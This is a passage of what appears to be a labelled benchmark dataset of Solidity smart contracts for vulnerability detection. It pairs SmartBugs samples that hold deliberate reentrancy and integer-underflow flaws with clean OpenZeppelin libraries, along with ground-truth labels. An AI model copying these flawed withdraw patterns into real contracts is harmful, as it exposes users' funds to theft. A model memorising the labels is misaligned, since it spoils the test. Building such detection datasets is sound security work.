    "contract_code": "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 27\n */\n\n//added pragma version\npragma solidity ^0.4.10;\n\ncontract EtherStore {\n\n    uint256 public withdrawalLimit = 1 ether;\n    mapping(address => uint256) public lastWithdrawTime;\n    mapping(address => uint256) public balances;\n\n    function depositFunds() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds (uint256 _weiToWithdraw) public {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        // limit the withdrawal\n        require(_weiToWithdraw <= withdrawalLimit);\n        // limit the time allowed to withdraw\n        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);\n        // <yes> <report> REENTRANCY\n        require(msg.sender.call.value(_weiToWithdraw)());\n        balances[msg.sender] -= _weiToWithdraw;\n        lastWithdrawTime[msg.sender] = now;\n    }\n }\n",
    "num_lines": 32,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "ERC1155Utils",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Utils.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (token/ERC1155/utils/ERC1155Utils.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC1155Receiver} from \"../IERC1155Receiver.sol\";\nimport {IERC1155Errors} from \"../../../interfaces/draft-IERC6093.sol\";\n\n/**\n * @dev Library that provide common ERC-1155 utility functions.\n *\n * See https://eips.ethereum.org/EIPS/eip-1155[ERC-1155].\n *\n * _Available since v5.1._\n */\nlibrary ERC1155Utils {\n    /**\n     * @dev Performs an acceptance check for the provided `operator` by calling {IERC1155Receiver-onERC1155Received}\n     * on the `to` address. The `operator` is generally the address that initiated the token transfer (i.e. `msg.sender`).\n     *\n     * The acceptance call is not executed and treated as a no-op if the target address doesn't contain code (i.e. an EOA).\n     * Otherwise, the recipient must implement {IERC1155Receiver-onERC1155Received} and return the acceptance magic value to accept\n     * the transfer.\n     */\n    function checkOnERC1155Received(\n        address operator,\n        address from,\n        address to,\n        uint256 id,\n        uint256 value,\n        bytes memory data\n    ) internal {\n        if (to.code.length > 0) {\n            try IERC1155Receiver(to).onERC1155Received(operator, from, id, value, data) returns (bytes4 response) {\n                if (response != IERC1155Receiver.onERC1155Received.selector) {\n                    // Tokens rejected\n                    revert IERC1155Errors.ERC1155InvalidReceiver(to);\n                }\n            } catch (bytes memory reason) {\n                if (reason.length == 0) {\n                    // non-IERC1155Receiver implementer\n                    revert IERC1155Errors.ERC1155InvalidReceiver(to);\n                } else {\n                    assembly (\"memory-safe\") {\n                        revert(add(reason, 0x20), mload(reason))\n                    }\n                }\n            }\n        }\n    }\n\n    /**\n     * @dev Performs a batch acceptance check for the provided `operator` by calling {IERC1155Receiver-onERC1155BatchReceived}\n     * on the `to` address. The `operator` is generally the address that initiated the token transfer (i.e. `msg.sender`).\n     *\n     * The acceptance call is not executed and treated as a no-op if the target address doesn't contain code (i.e. an EOA).\n     * Otherwise, the recipient must implement {IERC1155Receiver-onERC1155Received} and return the acceptance magic value to accept\n     * the transfer.\n     */\n    function checkOnERC1155BatchReceived(\n        address operator,\n        address from,\n        address to,\n        uint256[] memory ids,\n        uint256[] memory values,\n        bytes memory data\n    ) internal {\n        if (to.code.length > 0) {\n            try IERC1155Receiver(to).onERC1155BatchReceived(operator, from, ids, values, data) returns (\n                bytes4 response\n            ) {\n                if (response != IERC1155Receiver.onERC1155BatchReceived.selector) {\n                    // Tokens rejected\n                    revert IERC1155Errors.ERC1155InvalidReceiver(to);\n                }\n            } catch (bytes memory reason) {\n                if (reason.length == 0) {\n                    // non-IERC1155Receiver implementer\n                    revert IERC1155Errors.ERC1155InvalidReceiver(to);\n                } else {\n                    assembly (\"memory-safe\") {\n                        revert(add(reason, 0x20), mload(reason))\n                    }\n                }\n            }\n        }\n    }\n}\n",
    "num_lines": 89,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "RLP",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/RLP.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (utils/RLP.sol)\n\npragma solidity ^0.8.26;\n\nimport {Math} from \"./math/Math.sol\";\nimport {Accumulators} from \"./structs/Accumulators.sol\";\nimport {Bytes} from \"./Bytes.sol\";\nimport {Memory} from \"./Memory.sol\";\n\n/**\n * @dev Library for encoding and decoding data in RLP format.\n * Recursive Length Prefix (RLP) is the main encoding method used to serialize objects in Ethereum.\n * It's used for encoding everything from transactions to blocks to Patricia-Merkle tries.\n *\n * Inspired by\n *\n * * https://github.com/succinctlabs/optimism-bedrock-contracts/blob/main/rlp/RLPWriter.sol\n * * https://github.com/succinctlabs/optimism-bedrock-contracts/blob/main/rlp/RLPReader.sol\n *\n * == Canonical vs Non-Canonical Encodings\n *\n * According to the Ethereum Yellow Paper, a \"canonical\" RLP encoding is the unique, minimal\n * representation of a value. For scalar values (integers), this means:\n *\n * * No leading zero bytes (e.g., `0x0123` should be encoded as 2 bytes, not `0x000123` as 3 bytes)\n * * Single bytes less than 0x80 must be encoded directly without a prefix wrapper\n * * Zero is represented as an empty byte array (prefix `0x80`)\n *\n * A \"non-canonical\" encoding represents the same value but doesn't follow these minimality rules.\n * For example, encoding the integer 1234 (0x04d2) with a leading zero as `0x830004d2` instead\n * of the canonical `0x8204d2`.\n *\n * [IMPORTANT]\n * ====\n * This implementation takes a permissive approach to decoding, accepting some non-canonical\n * encodings (e.g., scalar values with leading zero bytes) that would be rejected by\n * strict implementations like go-ethereum. This design choice prioritizes compatibility\n * with diverse RLP encoders in the ecosystem over strict adherence to the Yellow Paper\n * specification's canonicalization requirements.\n *\n * Users should be aware that:\n *\n * * Multiple different RLP encodings may decode to the same value (non-injective)\n * * Encoding followed by decoding is guaranteed to work correctly\n * * External RLP data from untrusted sources may have non-canonical encodings\n * * Improperly wrapped single bytes (< 0x80) are still rejected as invalid\n * ====\n */\nlibrary RLP {\n    using Accumulators for *;\n    using Bytes for *;\n    using Memory for *;\n\n    /// @dev The item is not properly formatted and cannot de decoded.\n    error RLPInvalidEncoding();\n\n    enum ItemType {\n        Data, // Single data value\n        List // List of RLP encoded items\n    }\n\n    /**\n     * @dev Maximum length for data that will be encoded using the short format.\n     * If `data.length <= 55 bytes`, it will be encoded as: `[0x80 + length]` + data.\n     */\n    uint8 internal constant SHORT_THRESHOLD = 55;\n    /// @dev Single byte prefix for short strings (0-55 bytes)\n    uint8 internal constant SHORT_OFFSET = 0x80;\n    /// @dev Prefix for list items (0xC0)\n    uint8 internal constant LONG_OFFSET = 0xC0;\n\n    /****************************************************************************************************************\n     *                                              ENCODING - ENCODER                                              *\n     ****************************************************************************************************************/\n\n    struct Encoder {\n        Accumulators.Accumulator acc;\n    }\n\n    /// @dev Create an empty RLP Encoder.\n    function encoder() internal pure returns (Encoder memory enc) {\n        enc.acc = Accumulators.accumulator();\n    }\n\n    /// @dev Add a boolean to a given RLP Encoder.\n    function push(Encoder memory self, bool input) internal pure returns (Encoder memory) {\n        self.acc.push(encode(input));\n        return self;\n    }\n\n    /// @dev Add an address to a given RLP Encoder.\n    function push(Encoder memory self, address input) internal pure returns (Encoder memory) {\n        self.acc.push(encode(input));\n        return self;\n    }\n\n    /// @dev Add a uint256 to a given RLP Encoder.\n    function push(Encoder memory self, uint256 input) internal pure returns (Encoder memory) {\n        self.acc.push(encode(input));\n        return self;\n    }\n\n    /// @dev Add a bytes32 to a given RLP Encoder.\n    function push(Encoder memory self, bytes32 input) internal pure returns (Encoder memory) {\n        self.acc.push(encode(input));\n        return self;\n    }\n\n    /// @dev Add a bytes buffer to a given RLP Encoder.\n    function push(Encoder memory self, bytes memory input) internal pure returns (Encoder memory) {\n        self.acc.push(encode(input));\n        return self;\n    }\n\n    /// @dev Add a string to a given RLP Encoder.\n    function push(Encoder memory self, string memory input) internal pure returns (Encoder memory) {\n        self.acc.push(encode(input));\n        return self;\n    }\n\n    /// @dev Add an array of bytes to a given RLP Encoder.\n    function push(Encoder memory self, bytes[] memory input) internal pure returns (Encoder memory) {\n        self.acc.push(encode(input));\n        return self;\n    }\n\n    /// @dev Add an (input) Encoder to a (target) Encoder. The input is RLP encoded as a list of bytes, and added to the target Encoder.\n    function push(Encoder memory self, Encoder memory input) internal pure returns (Encoder memory) {\n        self.acc.push(encode(input));\n        return self;\n    }\n\n    /****************************************************************************************************************\n     *                                             ENCODING - TO BYTES                                              *\n     ****************************************************************************************************************/\n\n    /**\n     * @dev Encode a boolean as RLP.\n     *\n     * Boolean `true` is encoded as 0x01, `false` as 0x80 (equivalent to encoding integers 1 and 0).\n     * This follows the de facto ecosystem standard where booleans are treated as 0/1 integers.\n     */\n    function encode(bool input) internal pure returns (bytes memory result) {\n        assembly (\"memory-safe\") {\n            result := mload(0x40)\n            mstore(result, 0x01) // length of the encoded data: 1 byte\n            mstore8(add(result, 0x20), add(mul(iszero(input), 0x7f), 1)) // input\n            mstore(0x40, add(result, 0x21)) // reserve memory\n        }\n    }\n\n    /**\n     * @dev Encode an address as an RLP item of fixed size (20 bytes).\n     *\n     * The address is encoded with its leading zeros (if it has any). If someone wants to encode the address as a scalar,\n     * they can cast it to an uint256 and then call the corresponding {encode} function.\n     */\n    function encode(address input) internal pure returns (bytes memory result) {\n        assembly (\"memory-safe\") {\n            result := mload(0x40)\n            mstore(result, 0x15) // length of the encoded data: 1 (prefix) + 0x14 (address)\n            mstore(add(result, 0x20), or(shl(248, 0x94), shl(88, input))) // prefix (0x94 = SHORT_OFFSET + 0x14) + input\n            mstore(0x40, add(result, 0x35)) // reserve memory\n        }\n    }\n\n    /**\n     * @dev Encode an uint256 as an RLP scalar.\n     *\n     * Unlike {encode-bytes32-}, this function uses scalar encoding that removes the prefix zeros.\n     */\n    function encode(uint256 input) internal pure returns (bytes memory result) {\n        if (input < SHORT_OFFSET) {\n            assembly (\"memory-safe\") {\n                result := mload(0x40)\n                mstore(result, 0x01) // length of the encoded data: 1 byte\n                mstore8(add(result, 0x20), or(input, mul(0x80, iszero(input)))) // input (zero is encoded as 0x80)\n                mstore(0x40, add(result, 0x21)) // reserve memory\n            }\n        } else {\n            uint256 length = Math.log256(input) + 1;\n            assembly (\"memory-safe\") {\n                result := mload(0x40)\n                mstore(result, add(length, 1)) // length of the encoded data: 1 (prefix) + length\n                mstore8(add(result, 0x20), add(length, SHORT_OFFSET)) // prefix: SHORT_OFFSET + length\n                mstore(add(result, 0x21), shl(sub(256, mul(8, length)), input)) // input (aligned left)\n                mstore(0x40, add(result, add(length, 0x21))) // reserve memory\n            }\n        }\n    }\n\n    /**\n     * @dev Encode a bytes32 as an RLP item of fixed size (32 bytes).\n     *\n     * Unlike {encode-uint256-}, this function uses array encoding that preserves the prefix zeros.\n     */\n    function encode(bytes32 input) internal pure returns (bytes memory result) {\n        assembly (\"memory-safe\") {\n            result := mload(0x40)\n            mstore(result, 0x21) // length of the encoded data: 1 (prefix) + 0x20\n            mstore8(add(result, 0x20), 0xa0) // prefix: SHORT_OFFSET + 0x20\n            mstore(add(result, 0x21), input)\n            mstore(0x40, add(result, 0x41)) // reserve memory\n        }\n    }\n\n    /// @dev Encode a bytes buffer as RLP.\n    function encode(bytes memory input) internal pure returns (bytes memory) {\n        return (input.length == 1 && uint8(input[0]) < SHORT_OFFSET) ? input : _encode(input, SHORT_OFFSET);\n    }\n\n    /// @dev Encode a string as RLP. Type alias for {encode-bytes-}.\n    function encode(string memory input) internal pure returns (bytes memory) {\n        return encode(bytes(input));\n    }\n\n    /**\n     * @dev Encode an array of bytes as RLP.\n     * This function expects an array of already encoded bytes, not raw bytes.\n     * Users should call {encode} on each element of the array before calling it.\n     */\n    function encode(bytes[] memory input) internal pure returns (bytes memory) {\n        return _encode(input.concat(), LONG_OFFSET);\n    }\n\n    /// @dev Encode an encoder (list of bytes) as RLP\n    function encode(Encoder memory self) internal pure returns (bytes memory) {\n        return _encode(self.acc.flatten(), LONG_OFFSET);\n    }\n\n    function _encode(bytes memory input, uint256 offset) private pure returns (bytes memory result) {\n        uint256 length = input.length;\n        if (length <= SHORT_THRESHOLD) {\n            // Encode \"short-bytes\" as\n            // [ offset + input.length |\u00a0input ]\n            assembly (\"memory-safe\") {\n                result := mload(0x40)\n                mstore(result, add(length, 1)) // length of the encoded data: 1 (prefix) + input.length\n                mstore8(add(result, 0x20), add(length, offset)) // prefix: offset + input.length\n                mcopy(add(result, 0x21), add(input, 0x20), length) // input\n                mstore(0x40, add(result, add(length, 0x21))) // reserve memory\n            }\n        } else {\n            // Encode \"long-bytes\" as\n            // [ SHORT_THRESHOLD + offset + input.length.length | input.length | input ]\n            uint256 lenlength = Math.log256(length) + 1;\n            assembly (\"memory-safe\") {\n                result := mload(0x40)\n                mstore(result, add(add(length, lenlength), 1)) // length of the encoded data: 1 (prefix) + input.length.length + input.length\n                mstore8(add(result, 0x20), add(add(lenlength, offset), SHORT_THRESHOLD)) // prefix: SHORT_THRESHOLD + offset + input.length.length\n                mstore(add(result, 0x21), shl(sub(256, mul(8, lenlength)), length)) // input.length\n                mcopy(add(result, add(lenlength, 0x21)), add(input, 0x20), length) // input\n                mstore(0x40, add(result, add(add(length, lenlength), 0x21))) // reserve memory\n            }\n        }\n    }\n\n    /****************************************************************************************************************\n     *                               DECODING - READ FROM AN RLP ENCODED MEMORY SLICE                               *\n     ****************************************************************************************************************/\n\n    /**\n     * @dev Decode an RLP encoded bool. See {encode-bool}\n     *\n     * NOTE: This function treats any non-zero value as `true`, which is more permissive\n     * than some implementations (e.g., go-ethereum only accepts `0x00` for false and `0x01`\n     * for true). For example, `0x02`, `0x03`, etc. will all decode as `true`.\n     */\n    function readBool(Memory.Slice item) internal pure returns (bool) {\n        return readUint256(item) != 0;\n    }\n\n    /**\n     * @dev Decode an RLP encoded address. See {encode-address}\n     *\n     * [NOTE]\n     * ====\n     * This function accepts both single-byte encodings (for values 0-127, including\n     * precompile addresses like 0x01) and the standard 21-byte encoding with the `0x94` prefix.\n     * For example, `0x01` decodes to `0x0000000000000000000000000000000000000001`.\n     *\n     * Additionally, like {readUint256}, this function accepts non-canonical encodings with\n     * leading zeros. For instance, both `0x01` and `0x940000000000000000000000000000000000000001`\n     * decode to the same address.\n     * ====\n     */\n    function readAddress(Memory.Slice item) internal pure returns (address) {\n        uint256 length = item.length();\n        require(length == 1 || length == 21, RLPInvalidEncoding());\n        return address(uint160(readUint256(item)));\n    }\n\n    /**\n     * @dev Decode an RLP encoded uint256. See {encode-uint256}\n     *\n     * [NOTE]\n     * ====\n     * This function accepts non-canonical encodings with leading zero bytes for multi-byte values,\n     * which differs from the Ethereum Yellow Paper specification and some reference\n     * implementations like go-ethereum. For example, both `0x88ab54a98ceb1f0ad2` and\n     * `0x8900ab54a98ceb1f0ad2` will decode to the same uint256 value (12345678901234567890).\n     *\n     * However, single bytes less than 0x80 must NOT be wrapped with a prefix. For example,\n     * `0x8100` is invalid (should be `0x00`), but `0x820000` is valid (two zero bytes).\n     *\n     * This permissive behavior is intentional for compatibility with various RLP encoders\n     * in the ecosystem, but users should be aware that multiple RLP encodings may map\n     * to the same decoded value (non-injective decoding).\n     * ====\n     */\n    function readUint256(Memory.Slice item) internal pure returns (uint256) {\n        uint256 length = item.length();\n        require(length <= 33, RLPInvalidEncoding());\n\n        (uint256 itemOffset, uint256 itemLength, ItemType itemType) = _decodeLength(item);\n        require(itemType == ItemType.Data, RLPInvalidEncoding());\n\n        return itemLength == 0 ? 0 : uint256(item.load(itemOffset)) >> (256 - 8 * itemLength);\n    }\n\n    /**\n     * @dev Decode an RLP encoded bytes32. See {encode-bytes32}\n     *\n     * NOTE: Since this function delegates to {readUint256}, it inherits the non-canonical\n     * encoding acceptance behavior for multi-byte values. Multiple RLP encodings with different\n     * leading zero bytes may decode to the same bytes32 value, but single bytes < 0x80 must\n     * not be wrapped with a prefix (e.g., `0x820000` is valid, but `0x8100` is not).\n     */\n    function readBytes32(Memory.Slice item) internal pure returns (bytes32) {\n        return bytes32(readUint256(item));\n    }\n\n    /// @dev Decodes an RLP encoded bytes. See {encode-bytes}\n    function readBytes(Memory.Slice item) internal pure returns (bytes memory) {\n        (uint256 offset, uint256 length, ItemType itemType) = _decodeLength(item);\n        require(itemType == ItemType.Data, RLPInvalidEncoding());\n\n        // Length is checked by {slice}\n        return item.slice(offset, length).toBytes();\n    }\n\n    /// @dev Decodes an RLP encoded string. See {encode-string}\n    function readString(Memory.Slice item) internal pure returns (string memory) {\n        return string(readBytes(item));\n    }\n\n    /// @dev Decodes an RLP encoded list into an array of RLP Items.\n    function readList(Memory.Slice item) internal pure returns (Memory.Slice[] memory list) {\n        uint256 itemLength = item.length();\n\n        (uint256 listOffset, uint256 listLength, ItemType itemType) = _decodeLength(item);\n        require(itemType == ItemType.List && itemLength == listOffset + listLength, RLPInvalidEncoding());\n\n        // Start a buffer in the unallocated space\n        uint256 ptr;\n        assembly (\"memory-safe\") {\n            list := mload(0x40)\n            ptr := add(list, 0x20)\n        }\n\n        // Get all items in order, and push them to the buffer\n        for (uint256 currentOffset = listOffset; currentOffset < itemLength; ptr += 0x20) {\n            (uint256 elementOffset, uint256 elementLength, ) = _decodeLength(item.slice(currentOffset));\n            Memory.Slice element = item.slice(currentOffset, elementLength + elementOffset);\n            currentOffset += elementOffset + elementLength;\n\n            // Write item to the buffer\n            assembly (\"memory-safe\") {\n                mstore(ptr, element)\n            }\n        }\n\n        // write list length and reserve space\n        assembly (\"memory-safe\") {\n            mstore(list, div(sub(ptr, add(list, 0x20)), 0x20))\n            mstore(0x40, ptr)\n        }\n    }\n\n    /****************************************************************************************************************\n     *                                            DECODING - FROM BYTES                                             *\n     ****************************************************************************************************************/\n\n    /// @dev Decode an RLP encoded bool from bytes. See {readBool}\n    function decodeBool(bytes memory item) internal pure returns (bool) {\n        return readBool(item.asSlice());\n    }\n\n    /// @dev Decode an RLP encoded address from bytes. See {readAddress}\n    function decodeAddress(bytes memory item) internal pure returns (address) {\n        return readAddress(item.asSlice());\n    }\n\n    /// @dev Decode an RLP encoded uint256 from bytes. See {readUint256}\n    function decodeUint256(bytes memory item) internal pure returns (uint256) {\n        return readUint256(item.asSlice());\n    }\n\n    /// @dev Decode an RLP encoded bytes32 from bytes. See {readBytes32}\n    function decodeBytes32(bytes memory item) internal pure returns (bytes32) {\n        return readBytes32(item.asSlice());\n    }\n\n    /// @dev Decode an RLP encoded bytes from bytes. See {readBytes}\n    function decodeBytes(bytes memory item) internal pure returns (bytes memory) {\n        return readBytes(item.asSlice());\n    }\n\n    /// @dev Decode an RLP encoded string from bytes. See {readString}\n    function decodeString(bytes memory item) internal pure returns (string memory) {\n        return readString(item.asSlice());\n    }\n\n    /// @dev Decode an RLP encoded list from bytes. See {readList}\n    function decodeList(bytes memory value) internal pure returns (Memory.Slice[] memory) {\n        return readList(value.asSlice());\n    }\n\n    /**\n     * @dev Decodes an RLP `item`'s `length and type from its prefix.\n     * Returns the offset, length, and type of the RLP item based on the encoding rules.\n     */\n    function _decodeLength(Memory.Slice item) private pure returns (uint256, uint256, ItemType) {\n        uint256 itemLength = item.length();\n\n        require(itemLength != 0, RLPInvalidEncoding());\n        uint8 prefix = uint8(bytes1(item.load(0)));\n\n        if (prefix < LONG_OFFSET) {\n            // CASE: item\n            if (prefix < SHORT_OFFSET) {\n                // Case: Single byte below 128\n                return (0, 1, ItemType.Data);\n            } else if (prefix <= SHORT_OFFSET + SHORT_THRESHOLD) {\n                // Case: Short string (0-55 bytes)\n                uint256 strLength = prefix - SHORT_OFFSET;\n                require(\n                    itemLength > strLength && (strLength != 1 || bytes1(item.load(1)) >= bytes1(SHORT_OFFSET)),\n                    RLPInvalidEncoding()\n                );\n                return (1, strLength, ItemType.Data);\n            } else {\n                // Case: Long string (>55 bytes)\n                uint256 lengthLength = prefix - SHORT_OFFSET - SHORT_THRESHOLD;\n\n                bytes32 lenChunk = item.load(1);\n                require(itemLength > lengthLength && bytes1(lenChunk) != 0x00, RLPInvalidEncoding());\n\n                uint256 len = uint256(lenChunk) >> (256 - 8 * lengthLength);\n                require(len > SHORT_THRESHOLD && itemLength > lengthLength + len, RLPInvalidEncoding());\n\n                return (lengthLength + 1, len, ItemType.Data);\n            }\n        } else {\n            // Case: list\n            if (prefix <= LONG_OFFSET + SHORT_THRESHOLD) {\n                // Case: Short list\n                uint256 listLength = prefix - LONG_OFFSET;\n                require(item.length() > listLength, RLPInvalidEncoding());\n                return (1, listLength, ItemType.List);\n            } else {\n                // Case: Long list\n                uint256 lengthLength = prefix - LONG_OFFSET - SHORT_THRESHOLD;\n\n                bytes32 lenChunk = item.load(1);\n                require(itemLength > lengthLength && bytes1(lenChunk) != 0x00, RLPInvalidEncoding());\n\n                uint256 len = uint256(lenChunk) >> (256 - 8 * lengthLength);\n                require(len > SHORT_THRESHOLD && itemLength > lengthLength + len, RLPInvalidEncoding());\n\n                return (lengthLength + 1, len, ItemType.List);\n            }\n        }\n    }\n}\n",
    "num_lines": 477,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "simple_dao",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/simple_dao.sol",
    "contract_code": "/*\n * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#simpledao\n * @author: -\n * @vulnerable_at_lines: 19\n */\n\npragma solidity ^0.4.2;\n\ncontract SimpleDAO {\n  mapping (address => uint) public credit;\n\n  function donate(address to) payable {\n    credit[to] += msg.value;\n  }\n\n  function withdraw(uint amount) {\n    if (credit[msg.sender]>= amount) {\n      // <yes> <report> REENTRANCY\n      bool res = msg.sender.call.value(amount)();\n      credit[msg.sender]-=amount;\n    }\n  }\n\n  function queryCredit(address to) returns (uint){\n    return credit[to];\n  }\n}\n",
    "num_lines": 28,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol",
    "contract_code": "\n/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 55\n */\n\npragma solidity ^0.4.19;\n\ncontract ACCURAL_DEPOSIT\n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum = 1 ether;\n    \n    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)revert();\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)revert();\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 97,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "CrosschainLinked",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/crosschain/CrosschainLinked.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.26;\n\nimport {IERC7786GatewaySource} from \"../interfaces/draft-IERC7786.sol\";\nimport {InteroperableAddress} from \"../utils/draft-InteroperableAddress.sol\";\nimport {Bytes} from \"../utils/Bytes.sol\";\nimport {ERC7786Recipient} from \"./ERC7786Recipient.sol\";\n\n/**\n * @dev Core bridging mechanism.\n *\n * This contract contains the logic to register and send messages to counterparts on remote chains using ERC-7786\n * gateways. It ensure received messages originate from a counterpart. This is the base of token bridges such as\n * {BridgeERC20Core}.\n *\n * Contracts that inherit from this contract can use the internal {_sendMessageToCounterpart} to send messages to their\n * counterpart on a foreign chain. They must override the {_processMessage} function to handle messages that have\n * been verified.\n */\nabstract contract CrosschainLinked is ERC7786Recipient {\n    using Bytes for bytes;\n    using InteroperableAddress for bytes;\n\n    struct Link {\n        address gateway;\n        bytes counterpart; // Full InteroperableAddress (chain ref + address)\n    }\n    mapping(bytes chain => Link) private _links;\n\n    /**\n     * @dev Emitted when a new link is registered.\n     *\n     * Note: the `counterpart` argument is a full InteroperableAddress (chain ref + address).\n     */\n    event LinkRegistered(address gateway, bytes counterpart);\n\n    /**\n     * @dev Reverted when trying to register a link for a chain that is already registered.\n     *\n     * Note: the `chain` argument is a \"chain-only\" InteroperableAddress (empty address).\n     */\n    error LinkAlreadyRegistered(bytes chain);\n\n    constructor(Link[] memory links) {\n        for (uint256 i = 0; i < links.length; ++i) {\n            _setLink(links[i].gateway, links[i].counterpart, false);\n        }\n    }\n\n    /**\n     * @dev Returns the ERC-7786 gateway used for sending and receiving cross-chain messages to a given chain.\n     *\n     * Note: The `chain` parameter is a \"chain-only\" InteroperableAddress (empty address) and the `counterpart` returns\n     * the full InteroperableAddress (chain ref + address) that is on `chain`.\n     */\n    function getLink(bytes memory chain) public view virtual returns (address gateway, bytes memory counterpart) {\n        Link storage self = _links[chain];\n        return (self.gateway, self.counterpart);\n    }\n\n    /**\n     * @dev Internal setter to change the ERC-7786 gateway and counterpart for a given chain. Called at construction.\n     *\n     * Note: The `counterpart` parameter is the full InteroperableAddress (chain ref + address).\n     */\n    function _setLink(address gateway, bytes memory counterpart, bool allowOverride) internal virtual {\n        // Sanity check, this should revert if gateway is not an ERC-7786 implementation. Note that since\n        // supportsAttribute returns data, an EOA would fail that test (nothing returned).\n        IERC7786GatewaySource(gateway).supportsAttribute(bytes4(0));\n\n        bytes memory chain = _extractChain(counterpart);\n        if (allowOverride || _links[chain].gateway == address(0)) {\n            _links[chain] = Link(gateway, counterpart);\n            emit LinkRegistered(gateway, counterpart);\n        } else {\n            revert LinkAlreadyRegistered(chain);\n        }\n    }\n\n    /**\n     * @dev Internal messaging function\n     *\n     * Note: The `chain` parameter is a \"chain-only\" InteroperableAddress (empty address).\n     */\n    function _sendMessageToCounterpart(\n        bytes memory chain,\n        bytes memory payload,\n        bytes[] memory attributes\n    ) internal virtual returns (bytes32) {\n        (address gateway, bytes memory counterpart) = getLink(chain);\n        return IERC7786GatewaySource(gateway).sendMessage(counterpart, payload, attributes);\n    }\n\n    /// @inheritdoc ERC7786Recipient\n    function _isAuthorizedGateway(\n        address instance,\n        bytes calldata sender\n    ) internal view virtual override returns (bool) {\n        (address gateway, bytes memory router) = getLink(_extractChain(sender));\n        return instance == gateway && sender.equal(router);\n    }\n\n    function _extractChain(bytes memory self) private pure returns (bytes memory) {\n        (bytes2 chainType, bytes memory chainReference, ) = self.parseV1();\n        return InteroperableAddress.formatV1(chainType, chainReference, hex\"\");\n    }\n}\n",
    "num_lines": 109,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "integer_overflow_multitx_multifunc_feasible",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/integer_overflow_multitx_multifunc_feasible.sol",
    "contract_code": "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 25\n */\n\n//Multi-transactional, multi-function\n//Arithmetic instruction reachable\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowMultiTxMultiFuncFeasible {\n    uint256 private initialized = 0;\n    uint256 public count = 1;\n\n    function init() public {\n        initialized = 1;\n    }\n\n    function run(uint256 input) {\n        if (initialized == 0) {\n            return;\n        }\n        // <yes> <report> ARITHMETIC\n        count -= input;\n    }\n}\n",
    "num_lines": 28,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol",
